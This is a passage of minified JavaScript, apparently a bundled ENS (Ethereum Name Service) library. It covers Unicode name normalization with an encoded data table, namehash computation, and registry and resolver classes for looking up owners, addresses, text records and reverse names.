        }
        function o({S: l, B: u}, d, p) {
            if (!(l & 4 && p === d[d.length - 1])) {
                l & 2 && (p = d[d.length - 1]),
                l & 1 && e.push(d);
                for (let h of u)
                    for (let m of h.Q)
                        o(h, [...d, m], p)
            }
        }
    }
    function jM(t) {
        return t.toString(16).toUpperCase().padStart(2, "0")
    }
    function F_(t) {
        return `{${jM(t)}}`
    }
    function PM(t) {
        let e = [];
        for (let n = 0, s = t.length; n < s; ) {
            let o = t.codePointAt(n);
            n += o < 65536 ? 1 : 2,
            e.push(o)
        }
        return e
    }
    function ro(t) {
        let n = t.length;
        if (n < 4096)
            return String.fromCodePoint(...t);
        let s = [];
        for (let o = 0; o < n; )
            s.push(String.fromCodePoint(...t.slice(o, o += 4096)));
        return s.join("")
    }
    function HM(t, e) {
        let n = t.length
          , s = n - e.length;
        for (let o = 0; s == 0 && o < n; o++)
            s = t[o] - e[o];
        return s
    }
    var zM = "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";
    const Wl = 44032
      , Rd = 4352
      , Bd = 4449
      , Cd = 4519
      , Q_ = 19
      , V_ = 21
      , so = 28
      , Id = V_ * so
      , GM = Q_ * Id
      , qM = Wl + GM
      , FM = Rd + Q_
      , QM = Bd + V_
      , VM = Cd + so;
    function _l(t) {
        return t >> 24 & 255
    }
    function Y_(t) {
        return t & 16777215
    }
    let Ip, i1, kp, ju;
    function YM() {
        let t = H_(zM);
        Ip = new Map(z_(t).flatMap( (e, n) => e.map(s => [s, n + 1 << 24]))),
        i1 = new Set(Jl(t)),
        kp = new Map,
        ju = new Map;
        for (let[e,n] of G_(t)) {
            if (!i1.has(e) && n.length == 2) {
                let[s,o] = n
                  , l = ju.get(s);
                l || (l = new Map,
                ju.set(s, l)),
                l.set(o, e)
            }
            kp.set(e, n.reverse())
        }
    }
    function Z_(t) {
        return t >= Wl && t < qM
    }
    function ZM(t, e) {
        if (t >= Rd && t < FM && e >= Bd && e < QM)
            return Wl + (t - Rd) * Id + (e - Bd) * so;
        if (Z_(t) && e > Cd && e < VM && (t - Wl) % so == 0)
            return t + (e - Cd);
        {
            let n = ju.get(t);
            return n && (n = n.get(e),
            n) ? n : -1
        }
    }
    function K_(t) {
        Ip || YM();
        let e = []
          , n = []
          , s = !1;
        function o(l) {
            let u = Ip.get(l);
            u && (s = !0,
            l |= u),
            e.push(l)
        }
        for (let l of t)
            for (; ; ) {
                if (l < 128)
                    e.push(l);
                else if (Z_(l)) {
                    let u = l - Wl
                      , d = u / Id | 0
                      , p = u % Id / so | 0
                      , h = u % so;
                    o(Rd + d),
                    o(Bd + p),
                    h > 0 && o(Cd + h)
                } else {
                    let u = kp.get(l);
                    u ? n.push(...u) : o(l)
                }
                if (!n.length)
                    break;
                l = n.pop()
            }
        if (s && e.length > 1) {
            let l = _l(e[0]);
            for (let u = 1; u < e.length; u++) {
                let d = _l(e[u]);
                if (d == 0 || l <= d) {
                    l = d;
                    continue
                }
                let p = u - 1;
                for (; ; ) {
                    let h = e[p + 1];
                    if (e[p + 1] = e[p],
                    e[p] = h,
                    !p || (l = _l(e[--p]),
                    l <= d))
                        break
                }
                l = _l(e[u])
            }
        }
        return e
    }
    function KM(t) {
        let e = []
          , n = []
          , s = -1
          , o = 0;
        for (let l of t) {
            let u = _l(l)
              , d = Y_(l);
            if (s == -1)
                u == 0 ? s = d : e.push(d);
            else if (o > 0 && o >= u)
                u == 0 ? (e.push(s, ...n),
                n.length = 0,
                s = d) : n.push(d),
                o = u;
            else {
                let p = ZM(s, d);
                p >= 0 ? s = p : o == 0 && u == 0 ? (e.push(s),
                s = d) : (n.push(d),
                o = u)
            }
        }
        return s >= 0 && e.push(s, ...n),
        e
    }
    function X_(t) {
        return K_(t).map(Y_)
    }
    function XM(t) {
        return KM(K_(t))
    }
    const r1 = 45
      , J_ = "."
      , $_ = 65039
      , W_ = 1
      , kd = t => Array.from(t);
    function ec(t, e) {
        return t.P.has(e) || t.Q.has(e)
    }
    class JM extends Array {
        get is_emoji() {
            return !0
        }
    }
    let Op, eE, bs, Np, tE, za, Km, Ma, hs, s1, Mp;
    function P0() {
        if (Op)
            return;
        let t = H_(CM);
        const e = () => Jl(t)
          , n = () => new Set(e())
          , s = (m, y) => y.forEach(w => m.add(w));
        Op = new Map(G_(t)),
        eE = n(),
        bs = e(),
        Np = new Set(e().map(m => bs[m])),
        bs = new Set(bs),
        tE = n(),
        n();
        let o = z_(t)
          , l = t();
        const u = () => {
            let m = new Set;
            return e().forEach(y => s(m, o[y])),
            s(m, e()),
            m
        }
        ;
        za = $l(m => {
            let y = $l(t).map(w => w + 96);
            if (y.length) {
                let w = m >= l;
                y[0] -= 32,
                y = ro(y),
                w && (y = `Restricted[${y}]`);
                let E = u()
                  , S = u()
                  , _ = !t();
                return {
                    N: y,
                    P: E,
                    Q: S,
                    M: _,
                    R: w
                }
            }
        }
        ),
        Km = n(),
        Ma = new Map;
        let d = e().concat(kd(Km)).sort( (m, y) => m - y);
        d.forEach( (m, y) => {
            let w = t()
              , E = d[y] = w ? d[y - w] : {
                V: [],
                M: new Map
            };
            E.V.push(m),
            Km.has(m) || Ma.set(m, E)
        }
        );
        for (let {V: m, M: y} of new Set(Ma.values())) {
            let w = [];
            for (let S of m) {
                let _ = za.filter(b => ec(b, S))
                  , x = w.find( ({G: b}) => _.some(I => b.has(I)));
                x || (x = {
                    G: new Set,
                    V: []
                },
                w.push(x)),
                x.V.push(S),
                s(x.G, _)
            }
            let E = w.flatMap(S => kd(S.G));
            for (let {G: S, V: _} of w) {
                let x = new Set(E.filter(b => !S.has(b)));
                for (let b of _)
                    y.set(b, x)
            }
        }
        hs = new Set;
        let p = new Set;
        const h = m => hs.has(m) ? p.add(m) : hs.add(m);
        for (let m of za) {
            for (let y of m.P)
                h(y);
            for (let y of m.Q)
                h(y)
        }
        for (let m of hs)
            !Ma.has(m) && !p.has(m) && Ma.set(m, W_);
        s(hs, X_(hs)),
        s1 = UM(t).map(m => JM.from(m)).sort(HM),
        Mp = new Map;
        for (let m of s1) {
            let y = [Mp];
            for (let w of m) {
                let E = y.map(S => {
                    let _ = S.get(w);
                    return _ || (_ = new Map,
                    S.set(w, _)),
                    _
                }
                );
                w === $_ ? y.push(...E) : y = E
            }
            for (let w of y)
                w.V = m
        }
    }
    function H0(t) {
        return (nE(t) ? "" : `${z0(of([t]))} `) + F_(t)
    }
    function z0(t) {
        return `"${t}"‎`
    }
    function $M(t) {
        if (t.length >= 4 && t[2] == r1 && t[3] == r1)
            throw new Error(`invalid label extension: "${ro(t.slice(0, 4))}"`)
    }
    function WM(t) {
        for (let n = t.lastIndexOf(95); n > 0; )
            if (t[--n] !== 95)
                throw new Error("underscore allowed only at start")
    }
    function e6(t) {
        let e = t[0]
          , n = t1.get(e);
        if (n)
            throw Bl(`leading ${n}`);
        let s = t.length
          , o = -1;
        for (let l = 1; l < s; l++) {
            e = t[l];
            let u = t1.get(e);
            if (u) {
                if (o == l)
                    throw Bl(`${n} + ${u}`);
                o = l + 1,
                n = u
            }
        }
        if (o == s)
            throw Bl(`trailing ${n}`)
    }
    function of(t, e=1 / 0, n=F_) {
        let s = [];
        t6(t[0]) && s.push("◌"),
        t.length > e && (e >>= 1,
        t = [...t.slice(0, e), 8230, ...t.slice(-e)]);
        let o = 0
          , l = t.length;
        for (let u = 0; u < l; u++) {
            let d = t[u];
            nE(d) && (s.push(ro(t.slice(o, u))),
            s.push(n(d)),
            o = u + 1)
        }
        return s.push(ro(t.slice(o, l))),
        s.join("")
    }
    function t6(t, e) {
        return P0(),
        bs.has(t)
    }
    function nE(t) {
        return P0(),
        tE.has(t)
    }
    function n6(t) {
        return a6(i6(t, XM, c6))
    }
    function i6(t, e, n) {
        if (!t)
            return [];
        P0();
        let s = 0;
        return t.split(J_).map(o => {
            let l = PM(o)
              , u = {
                input: l,
                offset: s
            };
            s += l.length + 1;
            try {
                let d = u.tokens = l6(l, e, n), p = d.length, h;
                if (!p)
                    throw new Error("empty label");
                let m = u.output = d.flat();
                if (WM(m),
                !(u.emoji = p > 1 || d[0].is_emoji) && m.every(w => w < 128))
                    $M(m),
                    h = "ASCII";
                else {
                    let w = d.flatMap(E => E.is_emoji ? [] : E);
                    if (!w.length)
                        h = "Emoji";
                    else {
                        if (bs.has(m[0]))
                            throw Bl("leading combining mark");
                        for (let _ = 1; _ < p; _++) {
                            let x = d[_];
                            if (!x.is_emoji && bs.has(x[0]))
                                throw Bl(`emoji + combining mark: "${ro(d[_ - 1])} + ${of([x[0]])}"`)
                        }
                        e6(m);
                        let E = kd(new Set(w))
                          , [S] = s6(E);
                        o6(S, w),
                        r6(S, E),
                        h = S.N
                    }
                }
                u.type = h
            } catch (d) {
                u.error = d
            }
            return u
        }
        )
    }
    function r6(t, e) {
        let n, s = [];
        for (let o of e) {
            let l = Ma.get(o);
            if (l === W_)
                return;
            if (l) {
                let u = l.M.get(o);
                if (n = n ? n.filter(d => u.has(d)) : kd(u),
                !n.length)
                    return
            } else
                s.push(o)
        }
        if (n) {
            for (let o of n)
                if (s.every(l => ec(o, l)))
                    throw new Error(`whole-script confusable: ${t.N}/${o.N}`)
        }
    }
    function s6(t) {
        let e = za;
        for (let n of t) {
            let s = e.filter(o => ec(o, n));
            if (!s.length)
                throw za.some(o => ec(o, n)) ? rE(e[0], n) : iE(n);
            if (e = s,
            s.length == 1)
                break
        }
        return e
    }
    function a6(t) {
        return t.map( ({input: e, error: n, output: s}) => {
            if (n) {
                let o = n.message;
                throw new Error(t.length == 1 ? o : `Invalid label ${z0(of(e, 63))}: ${o}`)
            }
            return ro(s)
        }
        ).join(J_)
    }
    function iE(t) {
        return new Error(`disallowed character: ${H0(t)}`)
    }
    function rE(t, e) {
        let n = H0(e)
          , s = za.find(o => o.P.has(e));
        return s && (n = `${s.N} ${n}`),
        new Error(`illegal mixture: ${t.N} + ${n}`)
    }
    function Bl(t) {
        return new Error(`illegal placement: ${t}`)
    }
    function o6(t, e) {
        for (let n of e)
            if (!ec(t, n))
                throw rE(t, n);
        if (t.M) {
            let n = X_(e);
            for (let s = 1, o = n.length; s < o; s++)
                if (Np.has(n[s])) {
                    let l = s + 1;
                    for (let u; l < o && Np.has(u = n[l]); l++)
                        for (let d = s; d < l; d++)
                            if (n[d] == u)
                                throw new Error(`duplicate non-spacing marks: ${H0(u)}`);
                    if (l - s > n1)
                        throw new Error(`excessive non-spacing marks: ${z0(of(n.slice(s - 1, l)))} (${l - s}/${n1})`);
                    s = l
                }
        }
    }
    function l6(t, e, n) {
        let s = []
          , o = [];
        for (t = t.slice().reverse(); t.length; ) {
            let l = u6(t);
            if (l)
                o.length && (s.push(e(o)),
                o = []),
                s.push(n(l));
            else {
                let u = t.pop();
                if (hs.has(u))
                    o.push(u);
                else {
                    let d = Op.get(u);
                    if (d)
                        o.push(...d);
                    else if (!eE.has(u))
                        throw iE(u)
                }
            }
        }
        return o.length && s.push(e(o)),
        s
    }
    function c6(t) {
        return t.filter(e => e != $_)
    }
    function u6(t, e) {
        let n = Mp, s, o = t.length;
        for (; o && (n = n.get(t[--o]),
        !!n); ) {
            let {V: l} = n;
            l && (s = l,
            t.length = o)
        }
        return s
    }
    const d6 = t => n6(t)
      , fi = t => {
        let e = "";
        for (let n = 0; n < 32; n += 1)
            e += "00";
        if (t) {
            const s = d6(t).split(".");
            for (let o = s.length - 1; o >= 0; o -= 1) {
                const l = Tn(s[o]).slice(2);
                e = Tn(`0x${e}${l}`).slice(2)
            }
        }
        return `0x${e}`
    }
    ;
    var Bu = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    class f6 {
        constructor(e, n) {
            this.contract = new Ss(RM,n ?? Td.main,e),
            this.context = e
        }
        getOwner(e) {
            return Bu(this, void 0, void 0, function*() {
                try {
                    return this.contract.methods.owner(fi(e)).call()
                } catch {
                    throw new Error
                }
            })
        }
        getTTL(e) {
            return Bu(this, void 0, void 0, function*() {
                try {
                    return this.contract.methods.ttl(fi(e)).call()
                } catch {
                    throw new Error
                }
            })
        }
        recordExists(e) {
            return Bu(this, void 0, void 0, function*() {
                try {
                    return this.contract.methods.recordExists(fi(e)).call()
                } catch {
                    throw new Error
                }
            })
        }
        getResolver(e) {
            return Bu(this, void 0, void 0, function*() {
                try {
                    return this.contract.methods.resolver(fi(e)).call().then(n => {
                        if (typeof n == "string")
                            return new Ss(BM,n,this.context);
                        throw new Error
                    }
                    )
                } catch {
                    throw new Error
                }
            })
        }
        get events() {
            return this.contract.events
        }
    }
    var Fi = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    class h6 {
        constructor(e) {
            this.registry = e
        }
        getResolverContractAdapter(e) {
            return Fi(this, void 0, void 0, function*() {
                return this.registry.getResolver(e)
            })
        }
        checkInterfaceSupport(e, n) {
            var s, o;
            return Fi(this, void 0, void 0, function*() {
                if (Ee(e1[n]))
                    throw new Jb((s = e.options.address) !== null && s !== void 0 ? s : "",n);
                if (!(yield e.methods.supportsInterface(e1[n]).call()))
                    throw new Jb((o = e.options.address) !== null && o !== void 0 ? o : "",n)
            })
        }
        supportsInterface(e, n) {
            var s;
            return Fi(this, void 0, void 0, function*() {
                const o = yield this.getResolverContractAdapter(e);
                let l = n;
                if (!Ke(l)) {
                    if (l = (s = ac(n)) !== null && s !== void 0 ? s : "",
                    n === "")
                        throw new Error("Invalid interface Id");
                    l = l.slice(0, 10)
                }
                return o.methods.supportsInterface(l).call()
            })
        }
        getAddress(e, n=60) {
            return Fi(this, void 0, void 0, function*() {
                const s = yield this.getResolverContractAdapter(e);
                return yield this.checkInterfaceSupport(s, Ia.addr),
                s.methods.addr(fi(e), n).call()
            })
        }
        getPubkey(e) {
            return Fi(this, void 0, void 0, function*() {
                const n = yield this.getResolverContractAdapter(e);
                return yield this.checkInterfaceSupport(n, Ia.pubkey),
                n.methods.pubkey(fi(e)).call()
            })
        }
        getContenthash(e) {
            return Fi(this, void 0, void 0, function*() {
                const n = yield this.getResolverContractAdapter(e);
                return yield this.checkInterfaceSupport(n, Ia.contenthash),
                n.methods.contenthash(fi(e)).call()
            })
        }
        setAddress(e, n, s) {
            return Fi(this, void 0, void 0, function*() {
                const o = yield this.getResolverContractAdapter(e);
                return yield this.checkInterfaceSupport(o, Ia.setAddr),
                o.methods.setAddr(fi(e), n).send(s)
            })
        }
        getText(e, n) {
            return Fi(this, void 0, void 0, function*() {
                const s = yield this.getResolverContractAdapter(e);
                return yield this.checkInterfaceSupport(s, Ia.text),
                s.methods.text(fi(e), n).call()
            })
        }
        getName(e, n=!0) {
            return Fi(this, void 0, void 0, function*() {
                const s = `${e.toLowerCase().substring(2)}.addr.reverse`
                  , o = yield this.getResolverContractAdapter(s);
                return n && (yield this.checkInterfaceSupport(o, Ia.name)),
